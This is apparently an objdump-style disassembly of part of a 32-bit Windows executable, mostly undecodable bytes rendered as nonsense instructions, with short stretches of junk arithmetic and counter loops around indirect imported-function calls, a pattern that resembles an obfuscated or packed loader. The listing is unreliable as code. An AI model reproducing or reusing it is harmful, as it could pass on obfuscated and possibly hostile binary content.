  409cb3:	cmp    dl,BYTE PTR [eax+0x12d7ac68]
  409cb9:	pop    esp
  409cba:	pop    ss
  409cbb:	cmp    BYTE PTR [edi+0x64ff002f],0xc
  409cc2:	adc    BYTE PTR [ecx-0x25],ch
  409cc5:	jns    0x409d17
  409cc7:	xchg   ebx,eax
  409cc8:	mov    bl,0x48
  409cca:	adc    DWORD PTR [eax+0x15],eax
  409ccd:	or     eax,0xf1e99960
  409cd2:	jmp    0xf5bc112c
  409cd7:	mov    ch,0x95
  409cd9:	mov    BYTE PTR [ebp+esi*8+0xa],ch
  409cdd:	retf   0x7755
  409ce0:	jnp    0x409d34
  409ce2:	sbb    bl,dh
  409ce4:	sahf   
  409ce5:	out    dx,eax
  409ce6:	loop   0x409c87
  409ce8:	out    dx,al
  409ce9:	ins    BYTE PTR es:[edi],dx
  409cea:	push   ds
  409ceb:	ret    
  409cec:	scas   eax,DWORD PTR es:[edi]
  409ced:	push   cs
  409cee:	inc    ebx
  409cef:	jno    0x409cc6
  409cf1:	pop    esi
  409cf2:	(bad)  
  409cf3:	sub    eax,0x4e4f4c07
  409cf8:	and    bl,bl
  409cfa:	inc    edx
  409cfb:	or     ah,BYTE PTR [esi-0x2849461d]
  409d01:	inc    esp
  409d02:	imul   eax,ebp,0xab067f35
  409d08:	add    ecx,DWORD PTR [eax-0x1ca184a2]
  409d0e:	fistp  WORD PTR [edi+0x47]
  409d11:	jno    0x409d02
  409d13:	gs push ecx
  409d15:	dec    esi
  409d16:	lock cmp eax,0xb80ff27f
  409d1c:	aas    
  409d1d:	mov    edx,0x15d0c341
  409d22:	pop    ebp
  409d23:	push   esi
  409d24:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409d25:	int    0x72
  409d27:	mov    dh,0xce
  409d29:	cmp    edi,edx
  409d2b:	jmp    0xb04bc009
  409d30:	cdq    
  409d31:	push   eax
  409d32:	sbb    al,0x49
  409d34:	jl     0x409cef
  409d36:	bound  ebp,QWORD PTR [ebx]
  409d38:	fisttp QWORD PTR [edx]
  409d3a:	xchg   ecx,eax
  409d3b:	dec    esi
  409d3c:	lods   eax,DWORD PTR ds:[esi]
  409d3d:	pop    ss
  409d3e:	sub    eax,0x71bbb8bb
  409d43:	cmp    al,0x32
  409d45:	aam    0x95
  409d47:	aaa    
  409d48:	fisub  WORD PTR [esi]
  409d4a:	adc    DWORD PTR [edi+0x19],esi
  409d4d:	(bad)  
  409d4e:	xor    dl,BYTE PTR ss:[ebp+0x6a]
  409d52:	xor    DWORD PTR [edi-0x5840c099],0xbc67dc4c
  409d5c:	push   eax
  409d5d:	sub    al,0x77
  409d5f:	(bad)  [esi+0x29526075]
  409d65:	cmp    BYTE PTR [eax*8-0x4ae9ac0a],0x82
  409d6d:	dec    ebp
  409d6e:	xor    ch,BYTE PTR [edx-0x2d]
  409d71:	adc    BYTE PTR [eax-0x15ad48f7],dl
  409d77:	and    DWORD PTR [ecx],ebx
  409d79:	pop    ebx
  409d7a:	out    dx,al
  409d7b:	(bad)  
  409d7c:	adc    edi,ebx
  409d7e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409d7f:	test   ecx,edi
  409d81:	test   ecx,ecx
  409d83:	mov    DWORD PTR ds:0x433617,0x34e7
  409d8d:	je     0x409da7
  409d93:	mov    ecx,DWORD PTR [ebp+0x14]
  409d96:	mov    edi,DWORD PTR ds:0x43360b
  409d9c:	sub    DWORD PTR ds:0x4336df,edi
  409da2:	mov    ecx,DWORD PTR [ecx]
  409da4:	mov    DWORD PTR [ebp-0x1c],ecx
  409da7:	or     DWORD PTR ds:0x433653,ebx
  409dad:	jmp    0x40a010
  409db2:	push   eax
  409db3:	call   FWORD PTR [esi+0x50697168]
  409db9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409dba:	or     al,0x5f
  409dbc:	inc    edi
  409dbd:	pop    es
  409dbe:	fbld   TBYTE PTR [eax+0x11]
  409dc1:	or     bh,BYTE PTR [eax]
  409dc3:	loop   0x409e43
  409dc5:	jle    0x409dff
  409dc7:	jl     0x409e47
  409dc9:	jle    0x409dde
  409dcb:	sbb    esi,DWORD PTR [edi-0x7d]
  409dce:	push   eax
  409dcf:	lahf   
  409dd0:	jb     0x409d81
  409dd2:	repz push esp
  409dd4:	std    
  409dd5:	push   esi
  409dd6:	in     al,0xd4
  409dd8:	in     eax,0x8f
  409dda:	dec    edx
  409ddb:	arpl   WORD PTR [edx-0x39],dx
  409dde:	and    DWORD PTR [esi+0x68],ecx
  409de1:	xor    eax,esp
  409de3:	cmp    BYTE PTR [ecx+0x6db318a8],0x4b
  409dea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409deb:	jbe    0x409e62
  409ded:	xor    edi,DWORD PTR ds:0x808ff383
  409df3:	pusha  
  409df4:	or     DWORD PTR [ebx-0xe0e40b5],esp
  409dfa:	cs mov bh,0x2b
  409dfd:	pop    ebp
  409dfe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409dff:	rol    DWORD PTR [ebx],1
  409e01:	sbb    DWORD PTR [eax],0x4f3fe6c1
  409e07:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409e08:	js     0x409e3d
  409e0a:	mov    BYTE PTR [esi+0x24],ah
  409e0d:	mov    BYTE PTR es:[eax-0x48],cl
  409e11:	inc    ebx
  409e12:	int3   
  409e13:	inc    ecx
  409e14:	xchg   ebx,eax
  409e15:	or     al,0xbc
  409e17:	inc    eax
  409e18:	dec    esp
  409e19:	mov    al,ds:0x44cf5190
  409e1e:	mov    ah,0xf
  409e20:	xchg   ecx,eax
  409e21:	stos   DWORD PTR es:[edi],eax
  409e22:	pop    es
  409e23:	pop    ss
  409e24:	fadd   DWORD PTR [ebx+edx*4-0x56]
  409e28:	dec    esp
  409e29:	pop    ebx
  409e2a:	cmp    BYTE PTR [edi-0x55],al
  409e2d:	scas   eax,DWORD PTR es:[edi]
  409e2e:	xchg   ebx,eax
  409e2f:	inc    esp
  409e30:	mov    edx,0x1227b98b
  409e35:	lods   eax,DWORD PTR ds:[esi]
  409e36:	daa    
  409e37:	ret    0x7e40
  409e3a:	repz popf 
  409e3c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409e3d:	adc    DWORD PTR [esi],0xff8204fd
  409e43:	fidivr DWORD PTR [ecx]
  409e45:	mov    esp,0x7d5a1fe
  409e4a:	inc    edi
  409e4b:	mov    es,ecx
  409e4d:	call   0xe927:0xcacb866f
  409e54:	(bad)  
  409e55:	lea    edx,[edx]
  409e57:	sti    
  409e58:	or     DWORD PTR [eax-0x333f6cd],0xffffff9a
  409e5f:	jge    0x409e1f
  409e61:	jnp    0x409e58
  409e63:	(bad)  [eax]
  409e65:	mov    esp,0x36274b3f
  409e6a:	jmp    0xbb7c:0xda93ce2a
  409e71:	clc    
  409e72:	xor    bl,BYTE PTR [edx+ebp*1-0x4b]
  409e76:	sbb    eax,DWORD PTR [ebx]
  409e78:	mov    eax,ds:0x9ffc0a42
  409e7d:	ds test eax,esi
  409e80:	repnz push esi
  409e82:	sti    
  409e83:	pop    ss
  409e84:	or     eax,0xb04cbce0
  409e89:	xchg   edi,eax
  409e8a:	mov    cl,0x35
  409e8c:	aaa    
  409e8d:	imul   esi
  409e8f:	jae    0x409e7e
  409e91:	aad    0x86
  409e93:	inc    ebx
  409e94:	lds    ebx,FWORD PTR [ecx-0x9d6633d]
  409e9a:	xor    ch,BYTE PTR [ecx-0x37e39ddf]
  409ea0:	or     al,0xd2
  409ea2:	sub    BYTE PTR [ecx],ch
  409ea4:	xor    eax,0xabc91c10
  409ea9:	leave  
  409eaa:	int3   
  409eab:	mov    ch,0x5
  409ead:	xor    BYTE PTR [ebx],ah
  409eaf:	push   edi
  409eb0:	jl     0x409ee6
  409eb2:	xchg   ecx,eax
  409eb3:	or     eax,0xcc8dfb9f
  409eb8:	jge    0x409f03
  409eba:	pop    ss
  409ebb:	push   edx
  409ebc:	jg     0x409ec9
  409ebe:	mov    edi,0x33bf4995
  409ec3:	jne    0x409e99
  409ec5:	int    0x9f
  409ec7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409ec8:	sub    edx,DWORD PTR [edi]
  409eca:	pop    ebp
  409ecb:	sub    edx,DWORD PTR [ebp+0x2b5ec73f]
  409ed1:	pop    ss
  409ed2:	into   
  409ed3:	test   eax,0x3ed4e7f8
  409ed8:	cmp    BYTE PTR ds:0xfa9c8677,0x59
  409edf:	cmp    cl,BYTE PTR [ebx+eiz*4-0x64]
  409ee3:	sbb    DWORD PTR [esi],ecx
  409ee5:	cmp    al,0x6b
  409ee7:	jp     0x409e9a
  409ee9:	pop    es
  409eea:	sbb    edi,DWORD PTR [edi]
  409eec:	mov    ch,0xaf
  409eee:	stos   BYTE PTR es:[edi],al
  409eef:	out    0xf,al
  409ef1:	adc    DWORD PTR [edi],ecx
  409ef3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409ef4:	dec    ecx
  409ef5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409ef6:	aad    0xa7
  409ef8:	inc    esp
  409ef9:	stos   BYTE PTR es:[edi],al
  409efa:	and    ah,cl
  409efc:	lahf   
  409efd:	mov    bh,0xaf
  409eff:	sti    
  409f00:	retf   0x555d
  409f03:	loope  0x409f7c
  409f05:	adc    al,0xad
  409f07:	sub    dh,BYTE PTR [ebp+0x24]
  409f0a:	pop    esp
  409f0b:	mov    ebx,0x1870aa6e
  409f10:	mov    DWORD PTR [esi+0x54],edi
  409f13:	jae    0x409e9f
  409f15:	std    
  409f16:	scas   eax,DWORD PTR es:[edi]
  409f17:	push   0xffffff94
  409f19:	push   esp
  409f1a:	stos   DWORD PTR es:[edi],eax
  409f1b:	cld    
  409f1c:	add    DWORD PTR [eax-0x7d],ecx
  409f1f:	push   esi
  409f20:	mov    edx,0x4ac59cce
  409f25:	sbb    al,0xe
  409f27:	call   0x1d2067d5
  409f2c:	inc    edi
  409f2d:	daa    
  409f2e:	clc    
  409f2f:	inc    edx
  409f30:	xor    BYTE PTR [eax],0x26
  409f33:	dec    edx
  409f34:	mov    dh,al
  409f36:	xchg   ecx,eax
  409f37:	rol    DWORD PTR [ebx+0x1b],1
  409f3a:	sti    
  409f3b:	push   cs
  409f3c:	pop    ebx
  409f3d:	add    edx,DWORD PTR [eax+0x7b]
  409f40:	stc    
  409f41:	inc    eax
  409f42:	imul   ecx,DWORD PTR [ecx],0x5c657b0c
  409f48:	rcr    edi,0x1b
  409f4b:	mov    BYTE PTR [eax],ah
  409f4d:	mov    edi,0xfc7b3d54
  409f52:	xchg   esp,eax
  409f53:	fist   WORD PTR [edx]
  409f55:	adc    BYTE PTR [eax-0x5b],cl
  409f58:	cwde   
  409f59:	mov    eax,ds:0xe928293d
  409f5e:	cwde   
  409f5f:	popa   
  409f60:	jl     0x409f61
  409f62:	popf   
  409f63:	out    0xe4,eax
  409f65:	imul   esp,DWORD PTR [eax+0x489e492b],0x86b9881a
  409f6f:	aaa    
  409f70:	test   BYTE PTR [edx-0x3b7d38ce],dl
  409f76:	fbstp  TBYTE PTR [ebx-0x38]
  409f79:	mov    bl,0x3c
  409f7b:	aas    
  409f7c:	gs mov bh,0x38
  409f7f:	imul   DWORD PTR [ebx+0x254cc53a]
  409f85:	push   ebx
  409f86:	lahf   
  409f87:	in     eax,dx
  409f88:	cdq    
  409f89:	cwde   
  409f8a:	xchg   ebp,eax
  409f8b:	pop    ecx
  409f8c:	jecxz  0x409fa8
  409f8e:	and    bh,BYTE PTR [edi+0x39b1390e]
  409f94:	cmp    BYTE PTR [ebx-0x17],ah
  409f97:	lea    edi,[edi]
  409f99:	cmp    al,0x89
  409f9b:	pop    esp
  409f9c:	neg    DWORD PTR [edx+0x37]
  409f9f:	clc    
  409fa0:	mov    edi,0xc1778fdd
  409fa5:	lods   al,BYTE PTR ds:[esi]
  409fa6:	xor    esp,DWORD PTR [ebx+eax*4]
  409fa9:	cmc    
  409faa:	sub    BYTE PTR [eax+eiz*4+0x5cf6ed28],0x5f
  409fb2:	mov    gs,esi
  409fb4:	xor    BYTE PTR [ebx+0x3c995488],0x5a
  409fbb:	push   edx
  409fbc:	and    dl,bl
  409fbe:	(bad)  
  409fbf:	fsubr  DWORD PTR [edi-0x65]
  409fc2:	adc    al,0x5f
  409fc4:	data16 sbb BYTE PTR [ecx+0x12e380e9],dl
  409fcb:	pop    esp
  409fcc:	ss sub al,0x39
  409fcf:	inc    ebp
  409fd0:	repz mov dl,0xcd
  409fd3:	stos   DWORD PTR es:[edi],eax
  409fd4:	lods   eax,DWORD PTR ds:[esi]
  409fd5:	xchg   edx,eax
  409fd6:	xor    dh,0xca
  409fd9:	mov    esp,0x46bd97a7
  409fde:	lds    eax,FWORD PTR [ecx+0x37]
  409fe1:	jg     0x40a051
  409fe3:	add    eax,0xa0f0c5f4
  409fe8:	fist   WORD PTR [edx]
  409fea:	imul   edi,DWORD PTR [edi],0x6f4f8d8a
  409ff0:	jbe    0x409fdc
  409ff2:	push   DWORD PTR [eax+0x592b7ab1]
  409ff8:	xchg   edi,eax
  409ff9:	gs test al,0x20
  409ffc:	mov    edi,0x153f264f
  40a001:	out    0x14,eax
  40a003:	xor    al,0xad
  40a005:	les    edx,FWORD PTR [eax+0x34]
  40a008:	jle    0x40a048
  40a00a:	les    ecx,FWORD PTR [ecx]
  40a00c:	cmp    bl,BYTE PTR [ecx-0x34]
  40a00f:	fimul  DWORD PTR [edi]
  40a011:	scas   eax,DWORD PTR es:[edi]
  40a012:	sar    BYTE PTR [ecx+0x4573],1
  40a018:	mov    edi,DWORD PTR ds:0x4336d3
  40a01e:	sbb    DWORD PTR ds:0x43360f,edi
  40a024:	add    edx,ecx
  40a026:	mov    esi,0x7879
  40a02b:	mov    edi,0x1556
  40a030:	xchg   esi,ecx
  40a032:	adc    DWORD PTR ds:0x433663,edi
  40a038:	sub    edx,edi
  40a03a:	and    ecx,DWORD PTR ds:0x433623
  40a040:	xor    esi,esi
  40a042:	and    DWORD PTR ds:0x43365b,0x0
  40a04c:	mov    ecx,DWORD PTR ds:0x43365b
  40a052:	inc    ecx
  40a053:	mov    DWORD PTR ds:0x43365b,ecx
  40a059:	cmp    DWORD PTR ds:0x43365b,0x2e
  40a060:	jne    0x40a076
  40a066:	push   0x43383e
  40a06b:	push   0x400000
  40a070:	call   DWORD PTR ds:0x4120dc
  40a076:	cmp    DWORD PTR ds:0x43365b,0x1f
  40a07d:	jb     0x40a04c
  40a083:	mov    DWORD PTR [ebp-0x28],esi
  40a086:	mov    DWORD PTR ds:0x43360b,0x11
  40a090:	cmp    DWORD PTR ds:0x43360b,0x0
  40a097:	je     0x40a0f0
  40a09d:	cmp    DWORD PTR ds:0x43360b,0x6
  40a0a4:	jne    0x40a0be
  40a0aa:	push   DWORD PTR [ebp-0x24]
  40a0ad:	push   0x64fc
  40a0b2:	push   DWORD PTR [ebp-0x24]
  40a0b5:	push   DWORD PTR [ebp-0x14]
  40a0b8:	call   DWORD PTR ds:0x4122a4
  40a0be:	cmp    DWORD PTR ds:0x43360b,0x7
  40a0c5:	jne    0x40a0d8
  40a0cb:	mov    ecx,DWORD PTR ds:0x43360b
  40a0d1:	dec    ecx
  40a0d2:	mov    DWORD PTR ds:0x43360b,ecx
  40a0d8:	mov    ecx,DWORD PTR ds:0x43360b
  40a0de:	dec    ecx
  40a0df:	mov    DWORD PTR ds:0x43360b,ecx
  40a0e5:	jmp    0x40a090
  40a0ea:	adc    DWORD PTR ds:0x433603,ecx
  40a0f0:	mov    DWORD PTR [ebp-0x2c],esi
  40a0f3:	mov    ecx,DWORD PTR ds:0x43366f
  40a0f9:	sub    ecx,DWORD PTR ds:0x433613
  40a0ff:	mov    DWORD PTR ds:0x43366f,ecx
  40a105:	mov    DWORD PTR [ebp-0x14],esi
  40a108:	or     DWORD PTR ds:0x433667,0x653d
  40a112:	mov    DWORD PTR [ebp-0x8],esi
  40a115:	jmp    0x40a378
  40a11a:	mov    gs,ebp
  40a11c:	data16 fwait
  40a11e:	gs mov cl,0x53
  40a121:	jmp    0x31127192
  40a126:	stos   BYTE PTR es:[edi],al
  40a127:	int    0x49
  40a129:	aam    0x82
  40a12b:	loopne 0x40a1ab
  40a12d:	jle    0x40a167
  40a12f:	jl     0x40a1af
  40a131:	jle    0x40a155
  40a133:	fcom   DWORD PTR [edi+ebp*4]
  40a136:	jns    0x40a0dd
  40a138:	xor    al,0xa6
  40a13a:	sbb    ch,ah
  40a13c:	mov    ds:0x2a32315a,al
  40a141:	mov    cl,0x87
  40a143:	and    BYTE PTR [ebp+0x24],cl
  40a146:	test   eax,0xe8818c9d
  40a14b:	push   ss
  40a14c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a14d:	xchg   edi,eax
  40a14e:	xbegin 0x2552ad4d
  40a154:	(bad)  
  40a155:	int    0xf6
  40a157:	scas   al,BYTE PTR es:[edi]
  40a158:	cmp    eax,0x5e875761
  40a15d:	push   es
  40a15e:	mov    eax,ds:0xdfd4d7ea
  40a163:	dec    esp
  40a164:	mov    ebp,0xb555beee
  40a169:	jae    0x40a1d3
  40a16b:	ret    
  40a16c:	mov    al,0xaf
  40a16e:	mov    ecx,0xcae87b1a
  40a173:	dec    esi
  40a174:	in     al,dx
  40a175:	mov    ebx,0xbe46187d
  40a17a:	data16 cmc 
  40a17c:	adc    bh,BYTE PTR [ebx]
  40a17e:	or     DWORD PTR [edx],eax
  40a180:	push   0xe98608d0
  40a185:	or     esp,DWORD PTR [eax]
  40a187:	inc    ebp
  40a188:	mov    edx,0x257158f2
  40a18d:	mov    ds:0x6950abd0,eax
  40a192:	popa   
  40a193:	xchg   edx,eax
  40a194:	aaa    
  40a195:	dec    ecx
  40a196:	fadd   QWORD PTR [edi+0x65]
  40a199:	mov    ch,0xee
  40a19b:	aam    0xe5
  40a19d:	lods   eax,DWORD PTR ds:[esi]
  40a19e:	pop    esi
  40a19f:	pushf  
  40a1a0:	add    esp,DWORD PTR [edi-0x27]
  40a1a3:	xchg   esp,eax
  40a1a4:	scas   al,BYTE PTR es:[edi]
  40a1a5:	loop   0x40a1a1
  40a1a7:	add    bl,BYTE PTR [ebx+0x10]
  40a1aa:	out    0x14,al
  40a1ac:	neg    DWORD PTR [edx+0x6e]
  40a1af:	jo     0x40a1d0
  40a1b1:	loopne 0x40a197
  40a1b3:	jno    0x40a198
  40a1b5:	test   DWORD PTR [ebp-0x74],ecx
  40a1b8:	int    0x69
  40a1ba:	mov    ch,0xb2
  40a1bc:	xor    eax,0x44db9ef6
  40a1c1:	xor    DWORD PTR ds:0x9a326fbd,0xffffff90
  40a1c8:	vaesenc zmm5{z},zmm7,DWORD PTR [eax-0xe4]{1to16}
  40a1cf:	cmp    al,0x5c
  40a1d1:	mov    ch,0x53
  40a1d3:	(bad)  
  40a1d4:	jb     0x40a21e
  40a1d6:	mov    bh,0x9c
  40a1d8:	shl    DWORD PTR [ebx-0x27da0899],cl
  40a1de:	jb     0x40a234
  40a1e0:	sub    dh,0x9e
  40a1e3:	sbb    dh,dl
  40a1e5:	xlat   BYTE PTR ds:[ebx]
  40a1e6:	jmp    0x923ddf48
  40a1eb:	sbb    ah,BYTE PTR [ebx-0x9247e34]
  40a1f1:	int    0xdb
  40a1f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a1f4:	jg     0x40a20f
  40a1f6:	scas   al,BYTE PTR es:[edi]
  40a1f7:	out    dx,eax
  40a1f8:	mov    DWORD PTR [ebp-0xf0135c3],0x3ec17b20
  40a202:	add    ecx,DWORD PTR [edi-0x476af638]
  40a208:	mov    al,ds:0x698cb6a5
  40a20d:	(bad)  
  40a20f:	and    eax,0x424b69a3
  40a214:	jo     0x40a265
  40a216:	pop    edx
  40a217:	sbb    al,BYTE PTR [edi-0x49fb6fb3]
  40a21d:	and    al,0x7
  40a21f:	lahf   
  40a220:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a221:	adc    BYTE PTR [ebp+edx*8+0x74662ef3],cl
  40a228:	into   
  40a229:	pop    esi
  40a22a:	push   edx
  40a22b:	xor    edx,edi
  40a22d:	sbb    al,0x6b
  40a22f:	push   eax
  40a230:	loopne 0x40a1bd
  40a232:	lods   al,BYTE PTR ds:[esi]
  40a233:	mov    ?,ebp
  40a235:	sub    bl,al
  40a237:	add    cl,ch
  40a239:	push   eax
  40a23a:	dec    ebx
  40a23b:	ins    DWORD PTR es:[edi],dx
  40a23c:	in     eax,dx
  40a23d:	ror    DWORD PTR [ebx],cl
  40a23f:	scas   al,BYTE PTR es:[edi]
  40a240:	or     al,0x40
  40a242:	add    BYTE PTR [ecx+0x7b49d47d],al
  40a248:	shl    DWORD PTR [ebx-0xaf2d871],0x6c
  40a24f:	jno    0x40a28b
  40a251:	test   DWORD PTR [edx],esi
  40a253:	fst    QWORD PTR [edx-0x46f237b5]
  40a259:	xchg   ebp,eax
  40a25a:	ficomp WORD PTR [ebp+0x20]
  40a25d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a25e:	jbe    0x40a2d2
  40a260:	inc    esi
  40a261:	lods   al,BYTE PTR ds:[esi]
  40a262:	leave  
  40a263:	add    DWORD PTR [edx-0x7957fae1],0x2d
  40a26a:	nop
  40a26b:	loope  0x40a28a
  40a26d:	jne    0x40a241
  40a26f:	test   DWORD PTR [ecx],edx
  40a271:	rcl    DWORD PTR [esi],1
  40a273:	call   0x88144984
  40a278:	jl     0x40a2a8
  40a27a:	(bad)  
  40a27c:	jp     0x40a20b
  40a27e:	in     al,0xe
  40a280:	icebp  
  40a281:	xchg   esp,eax
  40a282:	shl    BYTE PTR [ebx],1
  40a284:	xchg   edx,eax
  40a285:	or     DWORD PTR ds:0x6bd1425a,0x52f459e
  40a28f:	adc    bl,BYTE PTR [edx-0x5031709c]
  40a295:	push   esi
  40a296:	ret    0x9625
  40a299:	out    0x37,al
  40a29b:	leave  
  40a29c:	out    dx,eax
  40a29d:	xor    edx,0xffffffaa
  40a2a0:	bound  ebx,QWORD PTR [ebp+eax*8-0x62]
  40a2a4:	aad    0xde
  40a2a6:	mov    edi,0x8aedf104
  40a2ab:	adc    DWORD PTR [edx],0xa6005f59
  40a2b1:	mov    eax,0x5b93c7fb
  40a2b6:	adc    ecx,DWORD PTR [edx-0x6d]
  40a2b9:	mov    al,0x9b
  40a2bb:	pop    esp
  40a2bc:	repz lea eax,[esi-0x6dfb739b]
  40a2c3:	or     eax,0x28d3b321
  40a2c8:	pop    edx
  40a2c9:	ret    0x2be2
  40a2cc:	shl    BYTE PTR [ecx-0x71],cl
  40a2cf:	jae    0x40a306
  40a2d1:	pop    ecx
  40a2d2:	iret   
  40a2d3:	or     eax,0x8f543edb
  40a2d8:	jno    0x40a27e
  40a2da:	pop    es
  40a2db:	push   edx
  40a2dc:	dec    esp
  40a2dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a2de:	mov    cl,0xea
  40a2e0:	xor    DWORD PTR [edx],0xeb70a954
  40a2e6:	cmp    al,0x28
  40a2e8:	or     ebp,DWORD PTR [ebx+0x5a]
  40a2eb:	das    
  40a2ec:	pop    ss
  40a2ed:	mov    dl,0x8f
  40a2ef:	iret   
  40a2f0:	fdiv   DWORD PTR [edx+0x4a]
  40a2f3:	daa    
  40a2f4:	cmp    eax,0xc369c193
  40a2f9:	test   eax,0xdd76024
  40a2fe:	push   edx
  40a2ff:	mov    esp,0x5bbe44eb
  40a304:	push   edx
  40a305:	mov    dl,0xcc
  40a307:	inc    eax
  40a308:	or     edx,DWORD PTR [edx+eiz*1-0xf]
  40a30c:	(bad)  
  40a30d:	aam    0x69
  40a30f:	shl    BYTE PTR [ebx],0xc1
  40a312:	(bad)  
  40a313:	jmp    0x40a2ba
  40a315:	pop    edx
  40a316:	mov    ecx,DWORD PTR [ebp+0x2a7a3bb9]
  40a31c:	push   eax
  40a31d:	mov    eax,0x20ba177e
  40a322:	push   esi
  40a323:	(bad)
  40a326:	sbb    eax,edx
  40a328:	popf   
  40a329:	add    DWORD PTR [edx],esi
  40a32b:	sbb    al,0x9b
  40a32d:	push   esi
  40a32e:	sbb    eax,0x82c0700d
  40a333:	nop
  40a334:	or     edi,ebp
  40a336:	mov    dl,0xf8
  40a338:	xchg   ebx,edx
  40a33a:	ret    0x3a74
  40a33d:	pop    esp
  40a33e:	jns    0x40a325
  40a340:	jns    0x40a347
  40a342:	sbb    al,bl
  40a344:	daa    
  40a345:	hlt    
  40a346:	(bad)  
  40a347:	mov    esp,0xde258dc7
  40a34c:	sbb    ebp,eax
  40a34e:	(bad)  
  40a350:	add    ch,BYTE PTR [eax]
  40a352:	push   ecx
  40a353:	mov    ecx,DWORD PTR [ebp-0x5eaec6e]
  40a359:	pop    eax
  40a35a:	adc    al,0xad
  40a35c:	push   ss
  40a35d:	sahf   
  40a35e:	ficom  DWORD PTR [edi+esi*2+0x4f]
  40a362:	pop    ds
  40a363:	jmp    0x51fc03d1
  40a368:	lods   eax,DWORD PTR ds:[esi]
  40a369:	push   0xb78f3a31
  40a36e:	xchg   ecx,eax
  40a36f:	add    eax,0x74
  40a372:	ss jbe 0x40a38e
  40a375:	sbb    bh,ch
  40a377:	or     eax,0x33e84d8b
  40a37c:	enter  0x2581,0xfb
  40a380:	xor    eax,0x43
  40a385:	add    BYTE PTR [eax],al
  40a387:	jmp    0x40a39a
  40a38c:	xor    eax,eax
  40a38e:	xor    eax,DWORD PTR ds:0x4335fb
  40a394:	inc    eax
  40a395:	mov    ds:0x4335fb,eax
  40a39a:	cmp    DWORD PTR ds:0x4335fb,0x16
  40a3a1:	jae    0x40a3e1
  40a3a7:	cmp    DWORD PTR ds:0x4335fb,0x21
  40a3ae:	jne    0x40a3dc
  40a3b4:	push   DWORD PTR [ebp-0x10]
  40a3b7:	push   0x4336ef
  40a3bc:	push   DWORD PTR [ebp-0x1c]
  40a3bf:	push   0x43366b
  40a3c4:	push   0x6a7c
  40a3c9:	push   DWORD PTR [ebp-0x14]
  40a3cc:	push   0x4bcb
  40a3d1:	push   0x5e17
  40a3d6:	call   DWORD PTR ds:0x412358
  40a3dc:	jmp    0x40a38c
  40a3e1:	xor    edi,edi
  40a3e3:	mov    DWORD PTR ds:0x433667,0x1d
  40a3ed:	cmp    DWORD PTR ds:0x433667,0x0
  40a3f4:	je     0x40a44f
  40a3fa:	cmp    DWORD PTR ds:0x433667,0x3
  40a401:	jne    0x40a422
  40a407:	push   DWORD PTR [ebp-0xc]
  40a40a:	push   0x73f7
  40a40f:	push   DWORD PTR [ebp-0x24]
  40a412:	push   0x3e3a
  40a417:	push   0x433697
  40a41c:	call   DWORD PTR ds:0x4120e0
  40a422:	cmp    DWORD PTR ds:0x433667,0x4
  40a429:	jne    0x40a43a
  40a42f:	mov    eax,ds:0x433667
  40a434:	dec    eax
  40a435:	mov    ds:0x433667,eax
  40a43a:	mov    eax,ds:0x433667
  40a43f:	dec    eax
  40a440:	mov    ds:0x433667,eax
  40a445:	jmp    0x40a3ed
  40a44a:	or     eax,0x5ffd
  40a44f:	add    ecx,ebx
  40a451:	mov    DWORD PTR ds:0x43361f,0x630a
  40a45b:	mov    DWORD PTR [ebp-0x20],ecx
  40a45e:	mov    eax,ds:0x43372f
  40a463:	mov    eax,DWORD PTR [ebp-0x20]
  40a466:	je     0x40bc6c
  40a46c:	mov    eax,DWORD PTR [ebp-0x4]
  40a46f:	xor    eax,0x7510854
  40a474:	sbb    DWORD PTR ds:0x433723,0x4336a7
  40a47e:	add    eax,ebx
  40a480:	mov    DWORD PTR ds:0x433607,0x108a
  40a48a:	jmp    0x40a6ed
  40a48f:	imul   ecx,DWORD PTR [edx+eax*1+0x2f],0x21
  40a494:	jno    0x40a509
  40a496:	dec    eax
  40a497:	test   DWORD PTR [eax-0x44],esi
  40a49a:	pusha  
  40a49b:	stos   BYTE PTR es:[edi],al
  40a49c:	das    
  40a49d:	ret    
  40a49e:	retf   
  40a49f:	dec    esp
  40a4a0:	out    dx,al
  40a4a1:	jle    0x40a521
  40a4a3:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40a4a7:	or     eax,DWORD PTR [edx+edi*4-0x27]
  40a4ab:	xor    edx,esi
  40a4ad:	inc    ecx
  40a4ae:	leave  
  40a4af:	sar    DWORD PTR [ecx],1
  40a4b1:	sub    BYTE PTR [eax-0x7c65db24],dh
  40a4b7:	mov    ch,0x7
  40a4b9:	ins    BYTE PTR es:[edi],dx
  40a4ba:	addr16 loopne 0x40a4f9
  40a4bd:	xchg   ecx,eax
  40a4be:	mov    al,0xd0
  40a4c0:	or     eax,DWORD PTR [esi+edx*4-0x66]
  40a4c4:	dec    esp
  40a4c5:	int    0x9a
  40a4c7:	das    
  40a4c8:	fwait
  40a4c9:	arpl   WORD PTR ds:0x7568511f,sp
  40a4cf:	aad    0x36
  40a4d1:	popf   
  40a4d2:	daa    
  40a4d3:	aaa    
  40a4d4:	cmp    BYTE PTR [ecx],dh
  40a4d6:	add    cl,BYTE PTR [eax+0xf]
  40a4d9:	(bad)  
  40a4da:	cmp    eax,0x20f6827d
  40a4df:	mov    ecx,0x511907db
  40a4e4:	xlat   BYTE PTR ds:[ebx]
  40a4e5:	clc    
  40a4e6:	push   ds
  40a4e7:	sbb    al,0x44
  40a4e9:	push   ds
  40a4ea:	jl     0x40a4ac
  40a4ec:	pop    esp
  40a4ed:	arpl   WORD PTR [ecx-0x14],cx
  40a4f0:	lea    edi,[ecx+0x1a]
  40a4f3:	test   DWORD PTR [esi-0x5f52725a],ebx
  40a4f9:	xor    cl,al
